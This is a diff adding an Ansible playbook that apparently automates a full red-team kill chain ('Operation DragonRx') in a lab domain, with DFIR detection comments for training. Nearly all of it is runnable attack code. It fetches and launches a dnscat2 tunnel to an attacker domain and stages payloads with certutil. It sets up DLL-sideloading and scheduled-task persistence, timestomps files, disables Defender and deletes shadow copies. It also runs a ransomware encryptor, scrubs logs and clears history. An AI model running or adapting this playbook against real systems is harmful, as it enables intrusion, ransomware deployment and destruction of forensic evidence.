+          --data-urlencode \
+          'c=wget -q http://10.0.0.5:8900/dnscat -O /tmp/.cache/dnscat && chmod +x /tmp/.cache/dnscat && nohup /tmp/.cache/dnscat --secret=DragonRx2024 tunnel.attacker-infra.com >/dev/null 2>&1 & echo DNSCAT_CLIENT:$!'
+      register: dnscat_client
+      ignore_errors: true
+      # DFIR: Zeek dns.log — high-entropy subdomain labels > 40 chars (MEDIUM)
+
+# ============================================================================
+# PHASE 8 — Persistence: DLL Sideloading on DC01
+# ATT&CK: T1574.002, T1053.005, T1070.006
+# ============================================================================
+
+- name: "PHASE 8 — DLL Sideloading Persistence on DC01"
+  hosts: dc01
+  gather_facts: false
+  vars:
+    kali_staging: "http://192.168.10.5:8900"
+    java_dir: 'C:\ProgramData\Oracle\Java\javapath'
+  tasks:
+    - name: "P8.1 | Create Oracle Java directory (blends with legitimate Oracle software)"
+      ansible.windows.win_file:
+        path: "{{ java_dir }}"
+        state: directory
+
+    - name: "P8.2 | Download signed java.exe via certutil (LOLBAS — T1105)"
+      ansible.windows.win_shell: |
+        certutil.exe -urlcache -f {{ kali_staging }}/java.exe "{{ java_dir }}\java.exe"
+      register: certutil_java
+      # DFIR: Sysmon EID 1 — certutil with URLCache flag in C:\ProgramData (HIGH)
+
+    - name: "P8.3 | Verify java.exe downloaded"
+      ansible.windows.win_shell: |
+        dir "{{ java_dir }}\java.exe"
+      register: java_verify
+
+    - name: "P8.4 | Upload malicious jvm.dll — RxPhage DLL loader (hijacks DLL search order)"
+      ansible.windows.win_copy:
+        src: /home/andrey/dragonrx-lab/attacker/tools/rxphage/rxphage_loader.dll
+        dest: "{{ java_dir }}\\jvm.dll"
+      register: dll_upload
+      # DFIR: Sysmon EID 11 — file created C:\ProgramData\Oracle (HIGH)
+      # When java.exe runs → Windows searches app dir first → loads jvm.dll → executes payload
+
+    - name: "P8.5 | Create scheduled task — JavaUpdateService (ONSTART / SYSTEM) (T1053.005)"
+      ansible.windows.win_shell: |
+        schtasks /create /tn "JavaUpdateService" /tr '"{{ java_dir }}\java.exe"' /sc ONSTART /ru SYSTEM /f
+      register: schtask_create
+      # DFIR: EID 4698 — scheduled task created by non-SYSTEM (HIGH)
+
+    - name: "P8.6 | Verify scheduled task"
+      ansible.windows.win_shell: |
+        schtasks /query /tn "JavaUpdateService" /fo LIST
+      register: task_verify
+
+    - debug:
+        msg: "{{ task_verify.stdout_lines }}"
+
+    - name: "P8.7 | Timestomp jvm.dll — set LastWriteTime to 2023-01-15 (T1070.006)"
+      ansible.windows.win_powershell:
+        script: |
+          (Get-Item "{{ java_dir }}\jvm.dll").LastWriteTime = '2023-01-15 09:00:00'
+      # DFIR: $STANDARD_INFORMATION.LastWriteTime = 2023 but $FILE_NAME = now → red flag
+      # Forensic: compare both MFT attributes — discrepancy reveals timestomping
+
+    - name: "P8.8 | Confirm timestomp applied"
+      ansible.windows.win_powershell:
+        script: |
+          (Get-Item "{{ java_dir }}\jvm.dll").LastWriteTime.ToString()
+      register: ts_check
+
+    - debug:
+        msg: "jvm.dll LastWriteTime (stomped): {{ ts_check.output }}"
+
+    - name: "P8.9 | Confirm directory listing shows fake 2023 timestamp"
+      ansible.windows.win_shell: |
+        dir /tw "{{ java_dir }}"
+      register: dir_check
+
+# ============================================================================
+# PHASE 9 — Ransomware Simulation (Optional)
+# ATT&CK: T1562.001, T1490, T1486
+# ============================================================================
+
+- name: "PHASE 9 — Ransomware Simulation on DC01"
+  hosts: dc01
+  gather_facts: false
+  vars:
+    kali_staging: "http://192.168.10.5:8900"
+  tasks:
+    - name: "P9.1 | Disable Windows Defender via registry (T1562.001)"
+      ansible.windows.win_regedit:
+        path: HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender
+        name: DisableAntiSpyware
+        data: 1
+        type: dword
+        state: present
+
+    - name: "P9.2 | Disable Defender real-time monitoring"
+      ansible.windows.win_powershell:
+        script: |
+          Set-MpPreference -DisableRealtimeMonitoring $true
+      ignore_errors: true
+
+    - name: "P9.3 | Delete VSS shadow copies — inhibit recovery (T1490)"
+      ansible.windows.win_shell: |
+        vssadmin delete shadows /all /quiet
+      ignore_errors: true
+      # DFIR: Sysmon EID 1 — vssadmin.exe delete shadows (HIGH)
+
+    - name: "P9.4 | Stop backup services (wbengine, SDRSVC, swprv) (T1490)"
+      ansible.windows.win_powershell:
+        script: |
+          foreach ($svc in @('wbengine', 'SDRSVC', 'swprv')) {
+            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
+          }
+      ignore_errors: true
+
+    - name: "P9.5 | Create test target files for encryption (safe — isolated path only)"
+      ansible.windows.win_powershell:
+        script: |
+          New-Item -ItemType Directory -Force -Path C:\Temp\RansomTest | Out-Null
+          "NovaTech Phase III Trial — Patient Cohort Alpha CONFIDENTIAL" |
+            Out-File C:\Temp\RansomTest\research.txt -Encoding utf8
+          "Proprietary Synthesis Formula v2.3 — RESTRICTED" |
+            Out-File C:\Temp\RansomTest\formula.xlsx -Encoding utf8
+
+    - name: "P9.6 | Stage encryptor via certutil (T1105)"
+      ansible.windows.win_shell: |
+        certutil.exe -urlcache -f {{ kali_staging }}/rxphage_encrypt.exe C:\Temp\rxphage_encrypt.exe
+
+    - name: "P9.7 | Run encryptor on isolated test path only (T1486)"
+      ansible.windows.win_shell: |
+        C:\Temp\rxphage_encrypt.exe --path C:\Temp\RansomTest\
+      ignore_errors: true
+      # DFIR: high-volume file rename/write events in short window (HIGH)
+
+    - name: "P9.8 | Display ransom note"
+      ansible.windows.win_shell: |
+        type C:\Temp\RansomTest\DRAGONRX_RANSOM.txt
+      register: ransom_note
+      ignore_errors: true
+
+    - debug:
+        msg: "{{ ransom_note.stdout_lines | default(['(no ransom note found — check encryptor)']) }}"
+
+# ============================================================================
+# PHASE 10 — Cleanup / Anti-Forensics
+# ATT&CK: T1070.004, T1070.001, T1070.006
+# ============================================================================
+
+- name: "PHASE 10a — Linux cleanup on web01"
+  hosts: web01
+  gather_facts: false
+  tasks:
+    - name: "P10.1 | Clear bash history"
+      shell: |
+        history -c && history -w
+        cat /dev/null > ~/.bash_history
+        unset HISTFILE
+      args:
+        executable: /bin/bash
+      ignore_errors: true
+
+    - name: "P10.2 | Scrub JNDI string from Tomcat access logs (T1070.004)"
+      shell: |
+        for f in $(find /opt/tomcat/logs -name "*.log" 2>/dev/null); do
+          grep -v 'jndi' "$f" > /tmp/clean_log 2>/dev/null && mv /tmp/clean_log "$f" || true
+        done
+      ignore_errors: true
+      # DFIR: file mtime on access.log changes — itself a detection signal
+
+    - name: "P10.3 | Kill temporary attacker processes on Kali (via host docker exec)"
+      shell: |
+        docker exec dragonrx_kali bash -c '
+          pkill -f "nc -lvnp" 2>/dev/null || true
+          pkill -f "http.server 8900" 2>/dev/null || true
+          pkill -f "dnscat2.rb" 2>/dev/null || true
+        '
+      delegate_to: localhost
+      ignore_errors: true
+
+    - name: "P10.4 | Remove temporary artifacts (KEEP webshell + rxphage for persistence)"
+      file:
+        path: "{{ item }}"
+        state: absent
+      loop:
+        - /tmp/revshell_output.txt
+        - /tmp/staging.log
+        - /tmp/dnscat2.log
+      ignore_errors: true
+
+- name: "PHASE 10b — Windows cleanup on DC01"
+  hosts: dc01
+  gather_facts: false
+  tasks:
+    - name: "P10.5 | Clear Windows event logs (T1070.001)"
+      ansible.windows.win_powershell:
+        script: |
+          $logs = @('Security', 'System', 'Application',
+                    'Microsoft-Windows-PowerShell/Operational',
+                    'Microsoft-Windows-Sysmon/Operational')
+          foreach ($log in $logs) {
+            try {
+              [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($log)
+            } catch {
+              wevtutil cl $log 2>$null
+            }
+          }
+      ignore_errors: true
+      # DFIR: EID 1102 — Security audit log was cleared (HIGH — itself a detection signal)
+      # DFIR: EID 104  — System log cleared
+
+    - name: "P10.6 | Clear PowerShell command history"
+      ansible.windows.win_powershell:
+        script: |
+          Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+          Clear-History
+      ignore_errors: true
+
+    - name: "P10.7 | Remove staging artifacts — KEEP DLL sideload + scheduled task"
+      ansible.windows.win_powershell:
+        script: |
+          $items = @(
+            'C:\Temp\lsass.dmp',
+            'C:\Temp\data.zip',
+            'C:\Temp\dc01_data.zip',
+            'C:\Temp\7za.exe',
+            'C:\Temp\rxphage.exe',
+            'C:\Temp\rxphage_encrypt.exe'
+          )
+          foreach ($item in $items) {
+            Remove-Item $item -Force -ErrorAction SilentlyContinue
+          }
+          Remove-Item 'C:\Temp\archive'    -Recurse -Force -ErrorAction SilentlyContinue
+          Remove-Item 'C:\Temp\RansomTest' -Recurse -Force -ErrorAction SilentlyContinue
+      ignore_errors: true
+
+    - name: "P10.8 | Verify DLL sideload persistence survived cleanup"
+      ansible.windows.win_shell: |
+        schtasks /query /tn JavaUpdateService /fo LIST
+        dir C:\ProgramData\Oracle\Java\javapath\
+      register: persistence_check
+
+    - debug:
+        msg: "Persistence intact: {{ persistence_check.stdout_lines }}"
+
+# ============================================================================
+# KILL CHAIN SUMMARY
+# ============================================================================
+
+- name: "KILL CHAIN COMPLETE"
+  hosts: localhost
+  gather_facts: false
+  tasks:
+    - name: "Operation DragonRx — full kill chain summary"
+      debug:
+        msg:
+          - "═══════════════════════════════════════════════════════════════════"
+          - "  OPERATION DRAGONRX — KILL CHAIN COMPLETE"
+          - "═══════════════════════════════════════════════════════════════════"
+          - "  INITIAL ACCESS  T1190      Log4Shell CVE-2021-44228 → root@web01"
+          - "  WEBSHELL        T1505.003  cache.jsp in Tomcat webroot"
+          - "  IMPLANT         T1059.004  dragonrx_beacon (Sliver HTTP→:80)"
+          - "  PERSIST Linux   T1053.003  cron @reboot rxphage on web01"
+          - "  DISCOVERY       T1552.001  /proc/1/environ → svc_ldap:NovaTech2021!"
+          - "  LDAP ENUM       T1087.002  users/SPNs/Domain Admins via ldapsearch"
+          - "  PORT SCAN       T1046      nmap from Kali — Windows services mapped"
+          - "  KERBEROAST      T1558.003  svc_backup TGS → Backup_Svc99! (john krb5-18)"
+          - "  NTDS DUMP       T1003.003  DRSUAPI → all domain NTLM hashes"
+          - "  LSASS DUMP      T1003.001  comsvcs MiniDump → C:\\Temp\\lsass.dmp on WS01"
+          - "  LATERAL WS01    T1021.002  jsmith smbexec → SYSTEM on WS01"
+          - "  PtH DC01        T1550.002  Administrator NTLM → DC01+FS01+WS01"
+          - "  WMI EXEC        T1047      wmiexec → WS01 (fewer artifacts than smbexec)"
+          - "  COLLECTION      T1005      FS01 Research + Manufacturing (smbclient mget)"
+          - "  STAGING         T1074.001  robocopy → C:\\Temp\\archive\\ on DC01"
+          - "  COMPRESS        T1560.001  7za.exe -p RxPhage2024! → C:\\Temp\\data.zip"
+          - "  EXFIL PRIMARY   T1041      smbclient C$ get data.zip from DC01"
+          - "  C2 BEACON DC01  T1041      dc01_http.exe → Sliver HTTP beaconing"
+          - "  EXFIL BACKUP    T1048.001  dnscat2 DNS tunnel from web01"
+          - "  DLL SIDELOAD    T1574.002  jvm.dll hijacks java.exe on DC01"
+          - "  SCHTASK         T1053.005  JavaUpdateService ONSTART SYSTEM (DC01)"
+          - "  TIMESTOMP       T1070.006  jvm.dll LastWriteTime = 2023-01-15"
+          - "  IMPAIR DEFENSES T1562.001  Defender disabled via registry + GPO"
+          - "  INHIBIT RECOV   T1490      vssadmin delete shadows /all"
+          - "  ENCRYPT FILES   T1486      rxphage_encrypt.exe → C:\\Temp\\RansomTest\\"
+          - "  CLEAR LOGS      T1070.001  wevtutil cl Security/System/Application"
+          - "  CLEAR HIST      T1070.004  bash history + PS PSReadLine history"
+          - "═══════════════════════════════════════════════════════════════════"
+          - "  LOOT DIR (Kali)     /opt/loot/ = ./attacker/loot/ on host"
+          - "  KEY DFIR ARTIFACTS:"
+          - "    Tomcat access.log — ${jndi:ldap://...} in X-Api-Version"
+          - "    Wazuh EID 4624/4662/4697/4698/4769/1102"
+          - "    Sysmon EID 1 (proc create) / 7 (DLL load) / 10 (lsass access) / 11 (file)"
+          - "    Zeek http.log — JNDI + webshell + beacon patterns"
+          - "    Zeek dns.log  — dnscat2 high-entropy labels"
+          - "    Zeek conn.log — beaconing rhythm to 10.0.0.10:80"
+          - "    NTDS dump     — /opt/loot/ntds_dump.txt"
+          - "    LSASS dump    — /opt/loot/lsass.dmp"
+          - "    Kerberoast    — /opt/loot/kerberoast_hashes.txt"
+          - "    DLL + schtask — C:\\ProgramData\\Oracle\\Java\\javapath\\ on DC01"
+          - "═══════════════════════════════════════════════════════════════════"
